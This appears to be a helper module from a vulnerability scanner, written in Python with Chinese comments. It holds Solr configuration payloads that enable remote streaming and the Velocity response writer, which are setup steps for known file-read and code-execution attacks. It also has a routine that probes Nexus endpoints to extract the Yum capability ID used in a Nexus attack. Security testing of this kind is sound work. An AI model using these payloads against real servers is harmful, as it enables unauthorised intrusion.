#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re

config_data_base = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
params_data_base = '''{"update-queryresponsewriter": {"startup": "lazy","name": "velocity","class": "solr.VelocityResponseWriter","template.base.dir": "","solr.resource.loader.enabled": "true","params.resource.loader.enabled": "true"}}'''

get_yumID_payloads = [
    {'path': 'service/siesta/capabilities/'},
    {'path': 'siesta/capabilities/'},
    {'path': 'capabilities/'},
]

def get_yumID(client, vul_info):
    ''' 获取Nexus Yum: Configuration的id '''
    headers = {
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Nexus-UI': 'true',
        'Referer': client.protocol_domain,
        'Origin': client.protocol_domain,
    }

    for payload in get_yumID_payloads:
        path = payload['path']
        
        res1 = client.request(
            'get',
            path,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res1 is None:
            return

        # * 查找Yum: Configuration的id
        yum_id_re = r'<id>.{16}</id><notes>Automatically added on.{0,40}</notes><enabled>(true|false)</enabled><typeId>yum</typeId>.*<key>createrepoPath</key><value>.{0,100}</value>'
        if (not re.search(yum_id_re, res1.text)):
            return None

        yum_id = re.search(yum_id_re, res1.text).group(0)[4:20]     # * 提取id
        
        return path + yum_id                                        # * 拼接path和yum id
    return None
